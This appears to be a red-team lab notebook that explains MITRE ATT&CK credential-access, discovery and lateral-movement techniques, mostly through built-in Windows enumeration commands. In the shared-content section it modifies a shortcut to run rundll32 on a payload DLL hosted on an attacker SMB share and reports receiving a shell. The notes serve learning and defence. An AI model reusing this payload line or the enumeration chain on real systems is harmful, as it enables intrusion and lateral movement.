### password-cracking

Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. OS Credential Dumping is used to obtain password hashes, this may only get an adversary so far when Pass the Hash is not an option. Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network. The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.

**Example:**

Password Cracking has been a great method to retrieve passwords offline, a technique used to not lock out accounts and leave logs off multiple attempts in an environment.

Some tools known for this attack are Aircrack-ng, Hashcat, John, Medusa, Ncrack, etc. In this example I will use 

**John The Ripper**

 just for a simple demonstration on how hashes can be cracked.

Simply by grabbing a sample of an NTLM hash file(

**You do not explicitly need this type but I will use this**

) and run it against john and a wordlist we can crack the hash and receive a password.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkdJx-CCRj7NzJCNRx%2F-MRkdL-RVrtYnXBh96WM%2Fimage.png?alt=media&token=68cb5fbb-64ed-4a80-a779-11f812e742aa)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkdJx-CCRj7NzJCNRx%2F-MRkdLsPhRB4aoEjVI3Y%2Fimage.png?alt=media&token=c5b7beae-05fb-4da6-996e-5ad44d505b20)

### password-guessing

Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.

Guessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.

Typically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:

·         SSH (22/TCP)

·         Telnet (32/TCP)

·         FTP (21/TCP)

·         NetBIOS /SMB / Samba (139/TCP & 445/TCP)

·         LDAP (389/TCP)

·         Kerberos (88/TCP)

·         RDP /Terminal Services (3389/TCP)

·         HTTP/HTTP Management Services (80/TCP & 443/TCP)

·         MSSQL (1433/TCP)

·         Oracle (1521/TCP)

·         MySQL (3306/TCP)

·         VNC (5900/TCP)

In addition to management services, adversaries may "target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols," as well as externally facing email applications, such as Office 365.

In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows "logon failure" event ID 4625.

# discovery

Discovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what's around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective.

## t1124-system-time-discovery

An adversary may gather the system time and/or time zone form a local or remote system. The system is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network.

System time information may be gathered in a number of ways, such as with Net on Windows by performing net time \hostname to gather the system time on a remote system. The victims time zone may also be inferred from the current system time or gathered by using w32tm /tz. The information could be useful for performing other techniques, such as executing a file with a Scheduled Task/Job, or to discover locality information based on time zone to assist in victim targeting.

**Example**

We will use the 2 utilities talked about on this technique to check the time on the host (

**This can also be done remotely but will require Administrator Privileges**

)

W32tm /tz

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS07gea5A782Vng9l_a%2F-MS07smqACGxdYWfdNnL%2Fimage.png?alt=media&token=326cee4b-d0f2-4a62-9e7c-6f825d3bd3b4)

Net time

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS07gea5A782Vng9l_a%2F-MS07tZkT0t_hl-Cq2Xr%2Fimage.png?alt=media&token=abccac71-75d3-4b38-a8f5-7c09efc8bf14)

## t1007-system-service-disvcovery

Adversaries may try to get information about registered services. Commands that may obtain information about services using operating system utilities are "sc", "tasklist /svc" using Tasklist, and "net start" using Net, but adversaries may also use other tools as well. Adversaries may use the information from System Service Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

**Example**

Previously demonstrated I have used the tasklist command or the cmdlet from PowerShell Get-Process we will also use the sc command to view services and schtasks for tasks

Tasklist

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS07JmoQQuxFcwQr5qH%2F-MS07cmLlnZlaFhqvHM6%2Fimage.png?alt=media&token=f1945fc3-301b-4a04-b60d-b92bc19d03ec)

Net Start

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS07JmoQQuxFcwQr5qH%2F-MS07dVztqF2i69b53_t%2Fimage.png?alt=media&token=e9eaff9c-f8c2-4f11-af8e-0a7ed3bf1d20)

Sc query

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS07JmoQQuxFcwQr5qH%2F-MS07fHBb3Eoxwvo3XCJ%2Fimage.png?alt=media&token=262fdaae-1b95-4c11-8ae8-600dbc7e9295)

Schtasks

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS07JmoQQuxFcwQr5qH%2F-MS07g4KhE6DJZ-s5sb7%2Fimage.png?alt=media&token=d8613268-dc3a-4927-bdee-ccaf60662177)

## t1033-system-owner-user-directory

Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

Utilities and commands that acquire this information include whoami. In Mac and Linux, the currently logged in user can be identified with w and who.

**Example**

Will work with the whoami command for Windows and check it's different features

**Whoami /user :**

 Display information on the current user and SID

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS07JmoQQuxFcwQr5qH%2F-MS07Snxj11HM0PR0IR8%2Fimage.png?alt=media&token=17b602cd-d7f3-4b86-a8bb-e108732737f5)

**Whoami /fqdn:**

 Displays information on the fully qualified domain name on the user

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS07JmoQQuxFcwQr5qH%2F-MS07TX00jOmW14lzI_e%2Fimage.png?alt=media&token=def95d1b-91b2-4c7f-ade4-13323c0f4ca8)

**Whoami /groups:**

 Displays the groups the user is a part of.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS07JmoQQuxFcwQr5qH%2F-MS07UJMPkP4Aw9_fQ9j%2Fimage.png?alt=media&token=34d4e19d-5de1-4531-8c9e-2f27feb95977)

## t1049-system-network-connections-discovery

Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network.

An adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.

Utilities and commands that acquire this information include netstat, "net use", and "net session" with Net. In Mac and Linux, netstat and lsof can be used to list current connections. Who -a and w can be used to show which users are currently logged in, similar to "net session".

**Example**

Working with the netstat, net use and net session commands to discover connections

NetStat

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS07BPfjdvoIXByhCRG%2F-MS07GytrXIZ1ux_m5mZ%2Fimage.png?alt=media&token=0c39f801-f941-4978-b7a6-66105f5a3ff0)

Net use

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS07BPfjdvoIXByhCRG%2F-MS07HcC2XqWcF1Zxbp7%2Fimage.png?alt=media&token=a47df53d-90dc-4697-bba8-a063850b91ba)

Net sessions

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS07BPfjdvoIXByhCRG%2F-MS07IMK_-IDsIPn6nBB%2Fimage.png?alt=media&token=66639171-426a-43b7-a0f3-714a323e4b6b)

## t1016-system-network-configuration-discovery

Adversaries may look for details about the Network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbstat, and route.

Adversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

**Example**

Will demonstrate the arp and ipconfig commands from CMD

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS071CqCpVHE4hh-wfX%2F-MS078bjCnWn974FMfFw%2Fimage.png?alt=media&token=9d187def-d1d5-4115-8b3b-e9edb2395ffd)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS071CqCpVHE4hh-wfX%2F-MS079QSgv2Wpx_h4pBb%2Fimage.png?alt=media&token=326be80c-5a03-437e-b0f8-e5c87fffd134)

## t1082-system-information-discovery

An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

Tools such as Systeminfo can be used to gather detailed system information. A breakdown of system data can also be gathered through the macOS systemsetup command, but requires administrative privileges.

Infrastructure as a Service (laaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.

**Example**

The systeminfo.exe command will help us get the general and detailed information about the host but we can also use the Get-ComputerInfo from PowerShell

CMD

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS06slGm-PdVVVXBlQX%2F-MS07-h69IKSnYkHdI8E%2Fimage.png?alt=media&token=c1e1e2b6-6bb0-4388-834b-71ac173104bb)

PowerShell

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS06slGm-PdVVVXBlQX%2F-MS070WQpF-tCYBAxPd3%2Fimage.png?alt=media&token=f025ca51-18da-4c1b-8512-bf9a973d379f)

## t1518-software-discovery

Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has version of software i=that is vulnerable to Exploitation for Privilege Escalation.

### security-software-discovery

Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

Example commands that can be used to obtain security software information are netsh, reg query with Reg, dir with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.

Adversaries may also utilize cloud APIs to discover the configurations of firewall within an environment.

**Example**

Will use WMIC to query and search for any installed Antivirus software on the system

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS06dWP1tgt0OYMPYYQ%2F-MS06rebp_o7KA_g_AFF%2Fimage.png?alt=media&token=1772ff35-1927-4fcc-ae4c-016457cc217d)

## t1018-remote-system-discovery

Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as Ping or net view using Net. Adversaries may also use local use local host files (ex: C:\Windows\System32\Drivers\etc\hosts or /etc/hosts) in order to discover the hostname to IP address mapping of remote systems.

Specific to macOS, the bonjour protocol exists to discover additional Mac-based systems within the same broadcast domain.

**Example**

Pinging computers on the sub-net we can see any of them that are currently alive around the network, we can do a ping sweep for CMD or PowerShell

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS06NH66JpQoVTeygNH%2F-MS06b8vAJfpD0C-1gxv%2Fimage.png?alt=media&token=ec7701f2-45ca-4d36-a6ac-8452c1fe672d)

## t1012-query-registry

Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.

The Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within the network. Adversaries may use the information from query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

**Example**

We can grab information about installed programs from the registry in this Demo we will use this command to check any installed office version

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS06NH66JpQoVTeygNH%2F-MS06TemKmYSy_U5dGVy%2Fimage.png?alt=media&token=71601bb8-f2d9-45ef-9f38-ff0742258807)

## t1057-process-discovery

Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

In Windows environments, adversaries could obtain details on running processes using the Task list utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.

**Example**

Using the Get-Process cmdlet from PowerShell we can view the necessary info. Or we can also just use the tasklist

command for CMD

**PowerShell**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS06FEBUjejwcVSIJkV%2F-MS06LcqWCc9y90eNX9g%2Fimage.png?alt=media&token=2a5f209e-9233-458f-928c-fe45b3cf0db7)

**CMD**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS06FEBUjejwcVSIJkV%2F-MS06MP92u8rns8gwonE%2Fimage.png?alt=media&token=47a1fb0b-7df1-4d8c-ae10-5b9daec5fa40)

## t1069-permissions-groups-discovery

Adversaries may attempt to find group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.

### local-groups

Adversaries may attempt to find local system groups and permissions settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.

Commands such as net localgroup of the Net utility, dscl . -list /Groups on macOS, and groups on Linux can list local groups.

**Eaxmple**

Enumerating local groups is simple with the net localgroup command

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS05sN5yfe96N_jdcI4%2F-MS064DyEosigzUl0Gcs%2Fimage.png?alt=media&token=27c5a932-40bd-45d4-b249-ef63f13f4e4e)

### domain-groups

Adversaries may attempt to find domain-level groups and permissions settings. The knowledge of domain-level permissions groups can help adversaries determine which group exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.

Commands such as net group /domain of the NET utility, dscacheutil -q group on macOS and ldapsearch on Llinux can list domain-level groups.

**Example**

We will need a domain user to query this information

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS065z8TXxpHJVk3kvy%2F-MS06Dwl722Af356bink%2Fimage.png?alt=media&token=e7605f74-3ff7-4928-82e4-4aedf9414c23)

## t1120-peripheral-device-discovery

Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or movable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.

**Example**

Utilizing the Pnputil utility we can find devices connected to the workstation and see if we can use this for (usually the most common reason) Lateral Movement.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS05k6WtjJ98V2RJNsL%2F-MS05qhf9Gwp0STKcUmD%2Fimage.png?alt=media&token=93c485c7-001a-4590-860c-979ba897db1d)

Reference:

Windows Device Console (Devcon.exe) - Windows drivers

docsmsft

​

## t1201-password-policy-discovery

Adversaries may attempt to access detailed information about the password policy used within an enterprise network. Password policies for networks are a way to enforce complex passwords that are difficult to guess or crack through Brute Force. This would help adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).

Password policies can be set and discovered on Windows, Linux, macOS systems via various command shell utilities such as net accounts (/domain), Get-ADDefaultDomainPasswordPolicy, chage -l, cat /etc/pam.d/common-password, and pwpolicy get account policies.

**Example**

Utilizing the net accounts command

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS05b27e9jsZLjanhNR%2F-MS05iWYP2TQNYPsjT4f%2Fimage.png?alt=media&token=ef900072-afc4-449f-a7d1-d5008df6d67f)

## t1040-network-sniffing

Adversaries may sniff network traffic to capture information about an environment, including material passed over the network. Network sniffing refers to using the Network interface on a system to monitor or capture information sent over the wired or wireless connection. An adversary may place a network into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.

Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as LLMNR/NBT-NS Poisoning and SMB Relay, can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to adversary.

Network sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, host-names, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities.

**Example**

As I have demonstrated this technique with Responder by poisoning requests we can use 2 other methods here Tcpdump for Windows or the built-in Windows utility netsh

** We will need Administrator privileges for both commands**

**tcpdump**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS05R_A-8ilIno2Knkj%2F-MS05Yep4Xf0stm-ZSr1%2Fimage.png?alt=media&token=c72d0771-127a-4e7d-9263-63c24156c816)

**Netsh**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS05R_A-8ilIno2Knkj%2F-MS05Zd9fS5wuiTh46Z9%2Fimage.png?alt=media&token=a7ff28ad-8f8e-45e4-afe5-8c6f090a6e63)

Netsh will create files that will need to be change to pcap or any file you are accustomed for analyzing packets

## t1135-network-share-discovery

Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network.

File sharing over a Windows network occurs over the SMB protocol. Net can be used to query a remote system for available shared drives using the net view \remotesystem command. It can also be used to query shared drives on the local system using net share.

**Example**

By locating machines on the network we can use this information to find any shares available on the Remote System.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS05BlxHiby19XAYSh0%2F-MS05QbORq34YtEi71Fc%2Fimage.png?alt=media&token=0c9abc20-b87d-4db3-b842-5e2d840a79d5)

## t1046-network-servie-scanning

Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system.

Within cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.

**Example**

Will use nmap for windows to achieve this goal, sometimes we will use tools that can be moved onto the compromised host and achieve ports scans on other systems, In this example we use it scan a remote system 

**Desktop-Bravo**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS05BlxHiby19XAYSh0%2F-MS05J0u5YOazmNRBpG1%2Fimage.png?alt=media&token=6446d3c7-069b-480d-a3c0-c716db1a3750)

## t1083-file-and-directory-discovery

Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors including whether or not the adversary fully infects the target and/or attempt specific actions.

Many command shell utilities can be used to obtain this information. Examples include dir, tree, ks, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API.

**Example**

Simple by using the dir command we can enumerate directories

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS05290rVCzac2t1JAB%2F-MS05Ac7GTMslHuW6vM1%2Fimage.png?alt=media&token=5d975d6d-57b9-49f8-a308-792d1397471d)

## t1486-domain-trust-discovery

Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain. Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct SID-History Injection, Pass the Ticket, and Kerberoasting. Domain trusts can be enumerated using the DSEnumerateDomainTrusts() Win32 API call, .NET methods, and LDAP. The windows utility Ntest is known to be used by adversaries to enumerate domain trusts.

**Example**

Using the nltest command we can search for the trusted domains

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS04ugILoGd99DvCjv5%2F-MS051UI4-aaLVF5PRjr%2Fimage.png?alt=media&token=56b4f198-3d02-451a-8819-e0f2e66f3a41)

## t1217-browser-bookmark-discovery

Adversaries may enumerate browser bookmarks to learn more about compromised hosts. Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.

Browsers bookmarks may also highlight additional targets after an adversary has access to valid credentials, especially Credentials in Files associated with logins cached by a browser.

Specific storage locations vary based on platform and/or application, but browser bookmarks are typically stored in local files/databases.

**Example**

This varies in the search since Browser's have their own folders for saving files an example would be Firefox directory found here:: 

** %APPDATA%\Mozilla\Firefox\Profiles\**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS04YiM_ssDKyBZHpvW%2F-MS04sCYKWiieMQ8Qn8i%2Fimage.png?alt=media&token=5230bf81-c8cb-4633-8d3f-df30ac106afd)

## t1010-application-window-discovery

Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used or give context to information collected by a keylogger.

**Example**

With Tasklist we can view the running applications and try to get information on how the Workstation is utilized for enumeration and see if it’s a potential target for Exploitation or other techniques.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS04YiM_ssDKyBZHpvW%2F-MS04hSZ11ToSryjE0PW%2Fimage.png?alt=media&token=a2fac8da-3f12-4b2c-8adc-688ccaaead62)

**Key loggers can be used as well to grab information on what the user is working on and see if this info is valuable.**

## t1087-account-discovery

Adversaries may attempt to get a listing of accounts on a system or within an environment. This information can help adversaries determine which accounts exist to aid follow-on behavior.

### domain-account

Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domains accounts exist to aid in follow-on behavior.

Commands such as net user /domain and net group /domain of the Net utility, dccacheutil -q group, on macOS, and ldapsearch on Linux can list domain users and groups.

**Example**

We can utilize the net user /domain command to view users on the Domain (User utilizing this command must be part of a Domain, we cannot use this if the user is Local)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS04RrlBURXpb1vnMZj%2F-MS04XBmA4s8zPE42rWG%2Fimage.png?alt=media&token=3718e527-8117-476e-a7a2-245053db56bc)

### local-account

Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exists on a system to aid in follow-on behavior.

Commands such as net user and net localgroup of the Net utility and id and groups on macOS and Linux can list local users and groups. On Linux, local users can also be enumerated using the /etc/passwd file.

**Example**

By utilizing the Net Users command on CMD we can view the local Accounts

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MS04CCbT9yy_c6oxNLC%2F-MS04R2AVP9lfniuqBY1%2Fimage.png?alt=media&token=6c29d870-aff6-4ccb-b6a4-4cccd7121343)

# lateral-movement

Lateral Movement consists of techniques that adversaries use to enter and control remote systems on a network. Following through on their primary objective often requires exploring the network to find their target and subsequently gaining access to it. Reaching their objective often involves pivoting through multiple systems and accounts to gain. Adversaries might install their own remote access tools to accomplish Lateral Movement or use legitimate credentials with native network and operating system tools, which may be stealthier.

## t1080-taint-shared-content

Adversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.

A directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses Shortcut Modification of directory .LNK files that use Masquerading to look like real directories, which are hidden through Hidden Files and Directories. The malicious .LNK-based directories have embedded command that executes the hidden malware file in the directory and the opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts.

Adversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.

**Example**

A way to demonstrate this technique is commonly by tainting a Shared Folder it's very common for domain users to have access to a folder where everyone has access to it, and modify as they need to update files. Now it sounds like a great workflow but it has a security issue.

**Everyone can ADD or MODIFY anything**

For example we have our Legitimate Login Portal Shortcut for everyone to access their email on our Temp Share available from the Desktop-Alpha. But here we have changed the properties to have it point to our payload in this case hosted on an SMBSERVER from our attacking machine and use rundll32 to execute.

**Rundll32.exe**

 

**\\[IP]\Share\payloadx64.dll,Control_Run**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRl2vvRa6DiKW8E-wvD%2F-MRl33-e7zjKME8YmDto%2Fimage.png?alt=media&token=b79adb59-9201-4891-b3dc-493dedba07e9)

Now with execution we receive a shell on our attacking machine

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRl2vvRa6DiKW8E-wvD%2F-MRl33sIrhNBzybtU54M%2Fimage.png?alt=media&token=c4bbe2ff-e29c-49b1-bb70-bad7d5d54b7f)

Above we see our shell getting executed and receiving a connection from the new machine since we were previously located on Desktop-Alpha

## t1072-software-deployment-tools

Adversaries may gain access to and use third-party software suites installed within an enterprise network, such as administration, monitoring, and deployment systems, to move laterally through the network. Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, VNC, HBSS, Altiris, etc.).

Access to third-party network-wide or enterprise-wide software system may enable an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.

The permission required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require administrative account to log in or to perform it's intended purpose.

**We have demonstrated this with VNC third party tool**

## t1021-remote-services

Adversaries may use Valid Accounts to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.

In an enterprise environments, servers and workstations can be organized into domains. Domain provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid credentials, they could login to many different machines using remote access protocols such as secure shell(SSH) or remote desktop protocol (RDP).

### windows-remote-management

Adversaries may use Valid Accounts to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.

WinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system(e.g., run an executable, modify the Registry, modify services). It may be called with the winrm command or by any number of programs such as PowerShell.

**Example**

Here we have a technique that will allow us to lateral move onto a different machine using he WinRM service, this can be easily taken advantage with the use of PowerShell

We can verify if this is available on our target with the 

**Test-WsMan**

 Cmdlet

